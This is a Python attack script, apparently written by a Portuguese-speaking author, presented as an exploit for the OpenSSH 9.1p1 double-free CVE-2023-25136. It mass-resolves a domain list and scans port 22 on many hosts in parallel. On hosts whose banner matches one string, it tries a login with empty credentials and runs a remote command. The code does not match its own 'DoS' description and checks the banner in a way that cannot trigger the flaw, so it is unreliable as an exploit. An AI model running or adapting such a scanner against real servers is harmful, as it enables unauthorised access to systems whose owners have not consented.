import paramiko
import socket
import concurrent.futures
from tqdm import tqdm
from termcolor import colored
import argparse
import tempfile


def resolve_host(host):
    try:
        ip = socket.gethostbyname(host)
        return host, ip
    except socket.gaierror:
        pass


def resolve_hosts(file_in):
    resolved = {}
    with open(file_in, 'r') as in_file:
        hosts = [line.strip() for line in in_file]
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(resolve_host, host) for host in hosts]
            for future in tqdm(concurrent.futures.as_completed(futures), total=len(hosts)):
                result = future.result()
                if result:
                    host, ip = result
                    resolved[host] = ip
    return resolved


def main(ips, wordlists):
    resolved_hosts = resolve_hosts(wordlists)
    with open(ips, "w") as out_file:
        for host, ip in resolved_hosts.items():
            print(colored(f"{host} {ip}","green",attrs=["bold"]))
            out_file.write(f"{ip}\n")


def check_ssh_connection(host):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if sock.connect_ex((host, 22)) == 0:
        banner = sock.recv(2048)
        print(colored(f"Testando EXPLOIT CVE-2023-25136 : {host}","red",attrs=["bold"]))
        sock.close()
        if banner == b"SSH-2.0-PuTTY_Release_0.64\n":
            print(colored("Vulneravel","red",attrs=["bold"]))
            transport = paramiko.Transport(host)
            transport.connect(username='', password='')
            ssh = paramiko.SSHClient()
            ssh._transport = transport
            stdin, stdout, stderr = ssh.exec_command('echo $SSH_CONNECTION')
            print(stdout.read())
            transport.close()

def main2(ips):
    with open(ips, 'r') as in_file:
        hosts = [line.strip() for line in in_file]
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(check_ssh_connection, host) for host in hosts]
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
            except Exception as exc:
                print(colored(f'generated an exception: {exc}',"yellow",attrs=["bold"])
)



if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog = "CVE-2023-25136",
                                     description = " DoS da vulnerabilidade OpenSSH 9.1p1 Double-Free CVE-2023-25136.",
                                     epilog = "By: ticofook")
    parser.add_argument('-o', help='Nome do arquivo de saida, default= convert-ip-validate.txt')
    parser.add_argument('input', help='Arquivo de entrada com a lista de domínios ou um único domínio.')
    
    args = parser.parse_args()
    try:
        with open(args.input, 'r') as in_file:
            pass
    except FileNotFoundError:
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as temp:
            temp.write(args.input + "\n")
            args.input = temp.name
    if not args.o:
        with open(args.input, 'r') as in_file:
            first_domain = in_file.readline().strip()
            args.o = first_domain + ".txt"


main(args.o , args.input)
main2(args.o)        
    

    
